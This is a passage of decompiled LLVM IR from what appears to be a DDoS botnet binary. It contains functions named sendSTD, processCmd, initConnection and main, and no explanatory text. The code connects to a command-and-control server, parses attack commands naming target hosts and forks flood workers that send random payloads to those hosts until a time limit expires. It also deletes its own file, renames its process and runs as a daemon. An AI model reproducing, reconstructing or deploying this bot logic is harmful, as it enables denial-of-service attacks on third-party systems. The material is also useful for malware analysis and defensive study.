  %v9_9688 = icmp eq i32 %v3_9674, %v5_9674
  br i1 %v9_9688, label %dec_label_pc_9690, label %dec_label_pc_9604

dec_label_pc_9690:                                ; preds = %dec_label_pc_9644
  store i32 %v2_9670, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_9670, %storemerge2
  br i1 %tmp, label %dec_label_pc_9604, label %dec_label_pc_96b0

dec_label_pc_96b0:                                ; preds = %dec_label_pc_9690
  store i32 %v5_965c, i32* @r4, align 4
  %v3_96b8 = mul i32 %v2_965c, 4
  %v2_96c4 = add i32 %v1_95ec, -4
  %v1_96c8 = add i32 %v2_96c4, %v3_96b8
  %v2_96d0 = inttoptr i32 %v1_96c8 to i32*
  store i32 %v0_9588, i32* %v2_96d0, align 4
  %v2_96d8 = load i32, i32* @global_var_1dafc.51, align 4
  %v1_96e0 = call i32 @free(i32 %v2_96d8)
  store i32 %v1_95ec, i32* @global_var_1dafc.51, align 4
  br label %dec_label_pc_96f8

dec_label_pc_96f8:                                ; preds = %entry, %dec_label_pc_96b0
  store i32 %v3_957c, i32* @r4, align 4
  store i32 %v6_957c, i32* @r5, align 4
  store i32 %v9_957c, i32* @r6, align 4
  ret i32 %v0_9588

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_9608, { 1, 0 }
  uselistorder i32 %v1_95ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_96f8, { 1, 0 }
  uselistorder label %dec_label_pc_9644, { 1, 0 }
  uselistorder label %dec_label_pc_9604, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9714 = load i32, i32* @fp, align 4
  store i32 %v3_9714, i32* %stack_var_-16, align 4
  store i32 38684, i32* %stack_var_-4, align 4
  %v2_9718 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9718, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-104, align 4
  %v8_9738 = icmp sgt i32 %arg4, 4096
  br i1 %v8_9738, label %dec_label_pc_98e0, label %dec_label_pc_973c

dec_label_pc_973c:                                ; preds = %entry
  %v13_9714 = ptrtoint i32* %stack_var_-16 to i32
  %v0_9748 = call i32 @socket()
  %v2_9758 = call i32 @__GI_time(i32* null)
  %v1_976c = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_9788 = bitcast i32* %stack_var_-56 to i8*
  %v3_9788 = call i32 @__GI_memset(i8* %v2_9788, i32 0)
  %v1_9790 = add i32 %v1_976c, 16
  %v2_9790 = inttoptr i32 %v1_9790 to i32*
  %v3_9790 = load i32, i32* %v2_9790, align 4
  %v1_9794 = inttoptr i32 %v3_9790 to i32*
  %v2_9794 = load i32, i32* %v1_9794, align 4
  %v2_979c = ptrtoint i32* %stack_var_-52 to i32
  %v1_97a4 = add i32 %v1_976c, 12
  %v2_97a4 = inttoptr i32 %v1_97a4 to i32*
  %v3_97a4 = load i32, i32* %v2_97a4, align 4
  store i32 %v3_97a4, i32* @r2, align 4
  %v3_97b4 = call i32 @bcopy(i32 %v2_9794, i32 %v2_979c, i32 %v3_97a4)
  %v1_97bc = add i32 %v1_976c, 8
  %v2_97bc = inttoptr i32 %v1_97bc to i32*
  %v3_97bc = load i32, i32* %v2_97bc, align 4
  %v3_97c4 = urem i32 %v3_97bc, 65536
  store i32 %v3_97c4, i32* %stack_var_-56, align 4
  %v2_9830 = ptrtoint i32* %stack_var_-88 to i32
  %v2_983c = bitcast i32* %stack_var_-88 to i8*
  %v3_988c = bitcast i32* %stack_var_-56 to %sockaddr*
  %v2_98a4 = add i32 %v2_9758, %arg3
  %v2_984c = add i32 %v13_9714, -72
  br label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_98d0, %dec_label_pc_973c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_973c ], [ %v1_98d4, %dec_label_pc_98d0 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_98d0, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_97f4
  %v2_9804 = call i32 @__GI_time(i32* null)
  %v1_9810 = call i32 @srand(i32 %v2_9804)
  %v1_9814 = call i32 @rand_init(i32 %v1_9810)
  %v0_9818 = call i32 @rand_next()
  %v1_9820 = mul i32 %v0_9818, 4
  %v3_9824 = and i32 %v1_9820, 12
  %v1_9828 = add nuw nsw i32 %v3_9824, 12
  %v3_983c = call i32 @rand_alphastr(i8* %v2_983c, i32 %v1_9828)
  %v2_9850 = add i32 %v2_984c, %v1_9828
  %v3_9858 = inttoptr i32 %v2_9850 to i8*
  store i8 0, i8* %v3_9858, align 4
  %v3_9864 = load i32, i32* %stack_var_-104, align 4
  %v6_9878 = call i32 @__libc_send(i32 %v0_9748, i32* nonnull %stack_var_-88, i32 %v3_9864, i32 0, i32 %v2_9830)
  %v4_988c = call i32 @__libc_connect(i32 %v0_9748, %sockaddr* %v3_988c, i32 16)
  %v2_9894 = call i32 @__GI_time(i32* null)
  %v5_98ac = icmp slt i32 %v2_9894, %v2_98a4
  br i1 %v5_98ac, label %dec_label_pc_98c8, label %dec_label_pc_98b0

dec_label_pc_98b0:                                ; preds = %dec_label_pc_9800
  %v1_98b4 = call i32 @__libc_close(i32 %v0_9748)
  %v1_98bc = call i32 @free(i32 %v2_9830)
  %v1_98c4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_98c8:                                ; preds = %dec_label_pc_9800
  br label %dec_label_pc_98d0

dec_label_pc_98d0:                                ; preds = %dec_label_pc_97f4, %dec_label_pc_98c8
  %stack_var_-28.0 = phi i32 [ %storemerge3, %dec_label_pc_97f4 ], [ 0, %dec_label_pc_98c8 ]
  %v1_98d4 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_97f4

dec_label_pc_98e0:                                ; preds = %entry
  store i32 %v3_9714, i32* @fp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_97a4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98d0, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_98ec = load i32, i32* @r4, align 4
  %v6_98ec = load i32, i32* @fp, align 4
  store i32 39156, i32* %stack_var_-4, align 4
  %v2_98f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98f0, i32* @fp, align 4
  %v2_9904 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i32]* @global_var_11e74.53 to i32), i32* @r1, align 4
  %v2_9910 = inttoptr i32 %v2_9904 to i8*
  %v3_9910 = call i32 @__GI_strcoll(i8* %v2_9910, i32 ptrtoint ([6 x i32]* @global_var_11e74.53 to i32))
  %v2_9918 = icmp eq i32 %v3_9910, 0
  br i1 %v2_9918, label %dec_label_pc_9920, label %dec_label_pc_9a44

dec_label_pc_9920:                                ; preds = %entry
  %v7_9928 = icmp slt i32 %arg1, 5
  br i1 %v7_9928, label %dec_label_pc_9b5c, label %dec_label_pc_992c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9920
  %v1_9930 = add i32 %tmp, 4
  %v1_9934 = inttoptr i32 %v1_9930 to i32*
  %v2_9934 = load i32, i32* %v1_9934, align 4
  %v1_9940 = add i32 %tmp, 8
  %v1_9944 = inttoptr i32 %v1_9940 to i32*
  %v2_9944 = load i32, i32* %v1_9944, align 4
  store i32 %v2_9944, i32* @r0, align 4
  %v1_994c = call i32 @atol(i32 %v2_9944)
  %v1_995c = add i32 %tmp, 12
  %v1_9960 = inttoptr i32 %v1_995c to i32*
  %v2_9960 = load i32, i32* %v1_9960, align 4
  store i32 %v2_9960, i32* @r0, align 4
  %v1_9968 = call i32 @atol(i32 %v2_9960)
  %v1_9978 = add i32 %tmp, 16
  %v1_997c = inttoptr i32 %v1_9978 to i32*
  %v2_997c = load i32, i32* %v1_997c, align 4
  store i32 %v2_997c, i32* @r0, align 4
  %v1_9984 = call i32 @atol(i32 %v2_997c)
  %v2_999c = call i32 @__GI_strchr(i32 %v2_9934, i32 44)
  %v2_99a4 = icmp eq i32 %v2_999c, 0
  br i1 %v2_99a4, label %dec_label_pc_9a18, label %dec_label_pc_99ac

dec_label_pc_99ac:                                ; preds = %dec_label_pc_992c
  store i32 %v2_9934, i32* @r0, align 4
  %v2_99b8 = call i32 @__GI_strtok(i32 %v2_9934, i32 ptrtoint ([5 x i32]* @global_var_11e78.55 to i32))
  %v2_9a0c7 = icmp eq i32 %v2_99b8, 0
  br i1 %v2_9a0c7, label %dec_label_pc_9a44, label %dec_label_pc_99c8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_99f4
  %storemerge48 = phi i32 [ %v2_99fc, %dec_label_pc_99f4 ], [ %v2_99b8, %dec_label_pc_99ac ]
  %v0_99c8 = call i32 @listFork()
  %v2_99d0 = icmp eq i32 %v0_99c8, 0
  br i1 %v2_99d0, label %dec_label_pc_99d8, label %dec_label_pc_99f4

dec_label_pc_99d8:                                ; preds = %dec_label_pc_99c8
  %v4_99e8 = call i32 @sendSTD(i32 %storemerge48, i32 %v1_994c, i32 %v1_9968, i32 %v1_9984)
  %v1_99f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99c8
  store i32 0, i32* @r0, align 4
  %v2_99fc = call i32 @__GI_strtok(i32 0, i32 ptrtoint ([5 x i32]* @global_var_11e78.55 to i32))
  %v2_9a0c = icmp eq i32 %v2_99fc, 0
  br i1 %v2_9a0c, label %dec_label_pc_9a44, label %dec_label_pc_99c8

dec_label_pc_9a18:                                ; preds = %dec_label_pc_992c
  %v0_9a18 = call i32 @listFork()
  %v2_9a20 = icmp eq i32 %v0_9a18, 0
  br i1 %v2_9a20, label %dec_label_pc_9a28, label %dec_label_pc_9b5c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_9a18
  %v4_9a38 = call i32 @sendSTD(i32 %v2_9934, i32 %v1_994c, i32 %v1_9968, i32 %v1_9984)
  %v1_9a40 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_9a44:                                ; preds = %dec_label_pc_99f4, %dec_label_pc_99ac, %entry
  %v2_9a48 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i32]* @global_var_11e7c.57 to i32), i32* @r1, align 4
  %v2_9a54 = inttoptr i32 %v2_9a48 to i8*
  %v3_9a54 = call i32 @__GI_strcoll(i8* %v2_9a54, i32 ptrtoint ([4 x i32]* @global_var_11e7c.57 to i32))
  %v2_9a5c = icmp eq i32 %v3_9a54, 0
  br i1 %v2_9a5c, label %dec_label_pc_9a64, label %dec_label_pc_9b5c

dec_label_pc_9a64:                                ; preds = %dec_label_pc_9a44
  br label %dec_label_pc_9b08

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9b08, %dec_label_pc_9b3c
  %v3_9a7c = mul i32 %v3_9b50, 4
  %v2_9a88 = load i32, i32* @global_var_1dafc.51, align 4
  %v2_9a8c = add i32 %v2_9a88, %v3_9a7c
  %v1_9a90 = inttoptr i32 %v2_9a8c to i32*
  %v2_9a90 = load i32, i32* %v1_9a90, align 4
  %v2_9a94 = icmp eq i32 %v2_9a90, 0
  br i1 %v2_9a94, label %dec_label_pc_9afc, label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_9a78
  %v2_9ab4 = load i32, i32* %v1_9a90, align 4
  store i32 %v2_9ab4, i32* @r4, align 4
  %v0_9ab8 = call i32 @__libc_getpid()
  %v0_9ac0 = load i32, i32* @r4, align 4
  %v9_9ac0 = icmp eq i32 %v0_9ac0, %v0_9ab8
  br i1 %v9_9ac0, label %dec_label_pc_9afc, label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9a9c
  %v0_9aec = call i32 @kill()
  %v1_9af4 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9a9c, %dec_label_pc_9a78, %dec_label_pc_9ac8
  %v12_9b6011 = phi i32 [ %v12_9b6012, %dec_label_pc_9a78 ], [ %v0_9ab8, %dec_label_pc_9a9c ], [ %v0_9aec, %dec_label_pc_9ac8 ]
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_9a78 ], [ %stack_var_-28.1, %dec_label_pc_9a9c ], [ %v1_9af4, %dec_label_pc_9ac8 ]
  %v1_9b00 = add i32 %v3_9b50, 1
  br label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9a64, %dec_label_pc_9afc
  %v12_9b6012 = phi i32 [ 0, %dec_label_pc_9a64 ], [ %v12_9b6011, %dec_label_pc_9afc ]
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_9a64 ], [ %stack_var_-28.0, %dec_label_pc_9afc ]
  %v3_9b50 = phi i32 [ 0, %dec_label_pc_9a64 ], [ %v1_9b00, %dec_label_pc_9afc ]
  %v5_9b20 = load i32, i32* @global_var_1b894.49, align 4
  %v9_9b34 = icmp eq i32 %v5_9b20, 0
  br i1 %v9_9b34, label %dec_label_pc_9b3c, label %dec_label_pc_9a78

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b08
  %v2_9b20 = load i32, i32* @global_var_1b890.48, align 4
  %tmp34 = icmp ugt i32 %v2_9b20, %v3_9b50
  br i1 %tmp34, label %dec_label_pc_9a78, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b3c, %dec_label_pc_9a18, %dec_label_pc_9a44, %dec_label_pc_9920
  %v12_9b60 = phi i32 [ %v0_9a18, %dec_label_pc_9a18 ], [ %v3_9a54, %dec_label_pc_9a44 ], [ 0, %dec_label_pc_9920 ], [ %v12_9b6012, %dec_label_pc_9b3c ]
  store i32 %v3_98ec, i32* @r4, align 4
  store i32 %v6_98ec, i32* @fp, align 4
  ret i32 %v12_9b60

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_99fc, { 1, 0 }
  uselistorder i32 %v1_9984, { 1, 0 }
  uselistorder i32 %v1_9968, { 1, 0 }
  uselistorder i32 %v1_994c, { 1, 0 }
  uselistorder i32 %v2_9934, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder label %dec_label_pc_9b5c, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_9b08, { 1, 0 }
  uselistorder label %dec_label_pc_9afc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
  uselistorder label %dec_label_pc_99c8, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9b7c = load i32, i32* @fp, align 4
  store i32 39812, i32* %stack_var_-4, align 4
  %v2_9b80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b80, i32* @fp, align 4
  %v2_9b94 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_9ba4 = bitcast i32* %stack_var_-4116 to i8*
  %v3_9ba4 = call i32 @__GI_memset(i8* %v2_9ba4, i32 0)
  %v2_9bac = load i32, i32* @global_var_1b898.46, align 4
  %v2_9bb0 = icmp eq i32 %v2_9bac, 0
  br i1 %v2_9bb0, label %dec_label_pc_9bd4, label %dec_label_pc_9bb8

dec_label_pc_9bb8:                                ; preds = %entry
  %v1_9bc4 = call i32 @__libc_close(i32 %v2_9bac)
  store i32 0, i32* @global_var_1b898.46, align 4
  br label %dec_label_pc_9bd4

dec_label_pc_9bd4:                                ; preds = %entry, %dec_label_pc_9bb8
  %v2_9bd8 = load i32, i32* @global_var_1b50c.62, align 4
  %v2_9bdc = icmp eq i32 %v2_9bd8, 0
  br i1 %v2_9bdc, label %dec_label_pc_9c08, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bd4
  %v1_9bfc = add i32 %v2_9bd8, 1
  br label %dec_label_pc_9c08

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9bd4, %dec_label_pc_9bf4
  %storemerge1 = phi i32 [ %v1_9bfc, %dec_label_pc_9bf4 ], [ 0, %dec_label_pc_9bd4 ]
  store i32 %storemerge1, i32* @global_var_1b50c.62, align 4
  %v4_9c20 = mul i32 %storemerge1, 4
  %v5_9c20 = add i32 %v4_9c20, ptrtoint ([15 x i8]** @global_var_1b508.65 to i32)
  %v6_9c20 = inttoptr i32 %v5_9c20 to i32*
  %v7_9c20 = load i32, i32* %v6_9c20, align 4
  %v2_9c2c = inttoptr i32 %v7_9c20 to i8*
  %v3_9c2c = call i32 @strcpy(i32 %v2_9b94, i8* %v2_9c2c)
  %v2_9c50 = call i32 @__GI_strchr(i32 %v2_9b94, i32 58)
  %v2_9c58 = icmp eq i32 %v2_9c50, 0
  br i1 %v2_9c58, label %dec_label_pc_9cb8, label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9c08
  %v2_9c74 = call i32 @__GI_strchr(i32 %v2_9b94, i32 58)
  %v1_9c7c = add i32 %v2_9c74, 1
  store i32 %v1_9c7c, i32* @r0, align 4
  %v1_9c84 = call i32 @atol(i32 %v1_9c7c)
  %v2_9ca4 = call i32 @__GI_strchr(i32 %v2_9b94, i32 58)
  %v3_9cb4 = inttoptr i32 %v2_9ca4 to i8*
  store i8 0, i8* %v3_9cb4, align 1
  br label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %dec_label_pc_9c08, %dec_label_pc_9c60
  %stack_var_-20.0 = phi i32 [ 445, %dec_label_pc_9c08 ], [ %v1_9c84, %dec_label_pc_9c60 ]
  %v0_9cc4 = call i32 @socket()
  store i32 %v0_9cc4, i32* @global_var_1b898.46, align 4
  %v4_9cf8 = call i32 @connectTimeout(i32 %v0_9cc4, i32 %v2_9b94, i32 %stack_var_-20.0, i32 30)
  %v2_9d00 = icmp eq i32 %v4_9cf8, 0
  %. = zext i1 %v2_9d00 to i32
  store i32 %v3_9b7c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_9b94, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9cb8, { 1, 0 }
  uselistorder label %dec_label_pc_9c08, { 1, 0 }
  uselistorder label %dec_label_pc_9bd4, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9d48 = load i32, i32* @r4, align 4
  store i32 %v3_9d48, i32* %stack_var_-20, align 4
  store i32 40272, i32* %stack_var_-4, align 4
  %v16_9d48 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9d4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d4c, i32* @fp, align 4
  %v1_9d88 = bitcast i8** %argv to i32*
  %v0_9d90 = call i32 @unlink()
  %v1_9d94 = call i32 @rand_init(i32 %v0_9d90)
  %v0_9d98 = call i32 @rand_next()
  %v1_9da0 = mul i32 %v0_9d98, 4
  %v3_9da4 = and i32 %v1_9da0, 12
  %v1_9da8 = add nuw nsw i32 %v3_9da4, 12
  %v2_9db0 = ptrtoint i32* %stack_var_-108 to i32
  %v2_9dbc = bitcast i32* %stack_var_-108 to i8*
  %v3_9dbc = call i32 @rand_alphastr(i8* %v2_9dbc, i32 %v1_9da8)
  %v2_9dcc = add i32 %v16_9d48, -88
  %v2_9dd0 = add i32 %v2_9dcc, %v1_9da8
  %v3_9dd8 = inttoptr i32 %v2_9dd0 to i8*
  store i8 0, i8* %v3_9dd8, align 4
  %v2_9dec = load i32, i32* %v1_9d88, align 4
  %v3_9dfc = call i32 @util_strcpy(i32 %v2_9dec, i32 %v2_9db0, i32 %v2_9db0)
  %v0_9e00 = call i32 @rand_next()
  %v2_9e10 = urem i32 %v0_9e00, 6
  %v3_9e18 = mul nuw nsw i32 %v2_9e10, 4
  %v1_9e1c = add nuw nsw i32 %v3_9e18, 12
  %v3_9e30 = call i32 @rand_alphastr(i8* %v2_9dbc, i32 %v1_9e1c)
  %v2_9e44 = add i32 %v2_9dcc, %v1_9e1c
  %v3_9e4c = inttoptr i32 %v2_9e44 to i8*
  store i8 0, i8* %v3_9e4c, align 4
  %v0_9e5c = call i32 @prctl()
  %v2_9e64 = call i32 @__GI_time(i32* null)
  store i32 %v2_9e64, i32* @r4, align 4
  %v0_9e6c = call i32 @__libc_getpid()
  %v0_9e74 = load i32, i32* @r4, align 4
  %v2_9e74 = xor i32 %v0_9e74, %v0_9e6c
  %v1_9e7c = call i32 @srand(i32 %v2_9e74)
  %v1_9e80 = call i32 @rand_init(i32 %v1_9e7c)
  %v0_9e84 = call i32 @__libc_fork()
  %v2_9e94 = icmp eq i32 %v0_9e84, 0
  br i1 %v2_9e94, label %dec_label_pc_9ec4, label %dec_label_pc_9eb8

dec_label_pc_9eb8:                                ; preds = %entry
  %v2_9e9c = ptrtoint i32* %stack_var_-144 to i32
  %v3_9eac = call i32 @__libc_waitpid(i32 %v0_9e84, i32 %v2_9e9c, i32 0)
  %v1_9eb4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9ee4

dec_label_pc_9ec4:                                ; preds = %entry
  %v0_9ec4 = call i32 @__libc_fork()
  %v2_9ed4 = icmp eq i32 %v0_9ec4, 0
  br i1 %v2_9ed4, label %dec_label_pc_9ee4, label %dec_label_pc_9edc

dec_label_pc_9edc:                                ; preds = %dec_label_pc_9ec4
  %v1_9ee0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9ee4

dec_label_pc_9ee4:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9ec4, %dec_label_pc_9edc
  %v0_9ee8 = call i32 @chdir()
  %v2_9ef4 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_a588 = ptrtoint i32* %stack_var_-4280 to i32
  %v4_a598 = bitcast i32* %stack_var_-4280 to i8*
  %v2_a208 = add i32 %v16_9d48, -4260
  %v1_a2a8 = or i32 %v2_a588, 1
  %v5_a2ac = inttoptr i32 %v1_a2a8 to i8*
  %v2_a2c8 = or i32 %v2_a588, 2
  %v2_a548 = add i32 %v16_9d48, -164
  br label %dec_label_pc_9efc

dec_label_pc_9efc:                                ; preds = %dec_label_pc_9efc, %dec_label_pc_a578, %dec_label_pc_9ee4
  %v0_9efc = call i32 @initConnection()
  %v2_9f04 = icmp eq i32 %v0_9efc, 0
  br i1 %v2_9f04, label %dec_label_pc_9f0c, label %dec_label_pc_9efc

dec_label_pc_9f0c:                                ; preds = %dec_label_pc_9efc
  br label %dec_label_pc_a578

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a188
  %v3_9f30 = mul i32 %storemerge11, 4
  %v2_9f3c = load i32, i32* @global_var_1dafc.51, align 4
  %v2_9f40 = add i32 %v2_9f3c, %v3_9f30
  %v1_9f44 = inttoptr i32 %v2_9f40 to i32*
  %v2_9f44 = load i32, i32* %v1_9f44, align 4
  %v3_9f54 = call i32 @__libc_waitpid(i32 %v2_9f44, i32 0, i32 1)
  %tmp93 = icmp slt i32 %v3_9f54, 1
  br i1 %tmp93, label %dec_label_pc_a17c, label %dec_label_pc_9fbc

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9fbc, %dec_label_pc_a018
  %v3_9f78 = mul i32 %v1_9f68, 4
  %v2_9f84 = load i32, i32* @global_var_1dafc.51, align 4
  %v2_9f88 = add i32 %v2_9f84, %v3_9f78
  %v1_9f8c = add i32 %v2_9f88, -4
  %v1_9fa8 = inttoptr i32 %v2_9f88 to i32*
  %v2_9fa8 = load i32, i32* %v1_9fa8, align 4
  %v2_9fac = inttoptr i32 %v1_9f8c to i32*
  store i32 %v2_9fa8, i32* %v2_9fac, align 4
  br label %dec_label_pc_9fbc

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9f2c, %dec_label_pc_9f74
  %v3_9f64.sink = phi i32 [ %v1_9f68, %dec_label_pc_9f74 ], [ %storemerge11, %dec_label_pc_9f2c ]
  %v1_9f68 = add i32 %v3_9f64.sink, 1
  %v2_9fd8 = load i32, i32* @global_var_1b890.48, align 4
  %v9_9ff8 = icmp eq i32 %v2_9fd8, 0
  br i1 %v9_9ff8, label %dec_label_pc_a018, label %dec_label_pc_9f74

dec_label_pc_a018:                                ; preds = %dec_label_pc_9fbc
  %v5_9fd8 = load i32, i32* @global_var_1b894.49, align 4
  %tmp94 = icmp ugt i32 %v5_9fd8, %v1_9f68
  br i1 %tmp94, label %dec_label_pc_9f74, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %dec_label_pc_a018
  %v3_a034 = mul i32 %v1_9f68, 4
  %v2_a040 = load i32, i32* @global_var_1dafc.51, align 4
  %v2_a044 = add i32 %v3_a034, -4
  %v1_a048 = add i32 %v2_a044, %v2_a040
  %v2_a050 = inttoptr i32 %v1_a048 to i32*
  store i32 0, i32* %v2_a050, align 4
  %v2_a058 = load i32, i32* @global_var_1b890.48, align 4
  %v5_a058 = load i32, i32* @global_var_1b894.49, align 4
  %v2_a064 = add i32 %v2_a058, -1
  %v3_a064 = icmp ne i32 %v2_a058, 0
  %v3_a068 = add i32 %v5_a058, -1
  %v4_a068 = zext i1 %v3_a064 to i32
  %v5_a068 = add i32 %v3_a068, %v4_a068
  store i32 %v2_a064, i32* @global_var_1b890.48, align 4
  store i32 %v5_a068, i32* @global_var_1b894.49, align 4
  %v3_a07c = udiv i32 %v2_a064, 1073741824
  %v3_a080 = mul i32 %v5_a068, 4
  %v2_a084 = or i32 %v3_a080, %v3_a07c
  store i32 %v2_a084, i32* @r4, align 4
  %v3_a088 = mul i32 %v2_a064, 4
  %v1_a08c = add i32 %v3_a088, 4
  %v1_a094 = call i32 @malloc(i32 %v1_a08c)
  br label %dec_label_pc_a0ec

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a0ec, %dec_label_pc_a148
  %v3_a0b0 = mul i32 %storemerge16, 4
  %v2_a0bc = add i32 %v3_a0b0, %v1_a094
  %v2_a0d0 = load i32, i32* @global_var_1dafc.51, align 4
  %v2_a0d4 = add i32 %v2_a0d0, %v3_a0b0
  %v1_a0d8 = inttoptr i32 %v2_a0d4 to i32*
  %v2_a0d8 = load i32, i32* %v1_a0d8, align 4
  %v2_a0dc = inttoptr i32 %v2_a0bc to i32*
  store i32 %v2_a0d8, i32* %v2_a0dc, align 4
  %v1_a0e4 = add i32 %storemerge16, 1
  br label %dec_label_pc_a0ec

dec_label_pc_a0ec:                                ; preds = %dec_label_pc_a030, %dec_label_pc_a0ac
  %storemerge16 = phi i32 [ 0, %dec_label_pc_a030 ], [ %v1_a0e4, %dec_label_pc_a0ac ]
  %v2_a108 = load i32, i32* @global_var_1b890.48, align 4
  %v9_a128 = icmp eq i32 %v2_a108, 0
  br i1 %v9_a128, label %dec_label_pc_a148, label %dec_label_pc_a0ac

dec_label_pc_a148:                                ; preds = %dec_label_pc_a0ec
  %v5_a108 = load i32, i32* @global_var_1b894.49, align 4
  %tmp = icmp ugt i32 %v5_a108, %storemerge16
  br i1 %tmp, label %dec_label_pc_a0ac, label %dec_label_pc_a160

dec_label_pc_a160:                                ; preds = %dec_label_pc_a148
  %v2_a164 = load i32, i32* @global_var_1dafc.51, align 4
  %v1_a16c = call i32 @free(i32 %v2_a164)
  store i32 %v1_a094, i32* @global_var_1dafc.51, align 4
  br label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_9f2c, %dec_label_pc_a160
  %v1_a180 = add i32 %storemerge11, 1
  br label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a578, %dec_label_pc_a17c
  %storemerge11 = phi i32 [ %v1_a180, %dec_label_pc_a17c ], [ 0, %dec_label_pc_a578 ]
  %v3_a190 = ashr i32 %storemerge11, 31
  %v2_a1a4 = load i32, i32* @global_var_1b890.48, align 4
  %v5_a1a4 = load i32, i32* @global_var_1b894.49, align 4
  %v3_a1c0 = icmp uge i32 %v2_a1a4, %v3_a190
  %v9_a1c0 = icmp eq i32 %v2_a1a4, %v3_a190
  %v2_a1c4 = xor i1 %v9_a1c0, true
  %v3_a1c4 = and i1 %v3_a1c0, %v2_a1c4
  br i1 %v3_a1c4, label %dec_label_pc_9f2c, label %dec_label_pc_a1c8

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a188
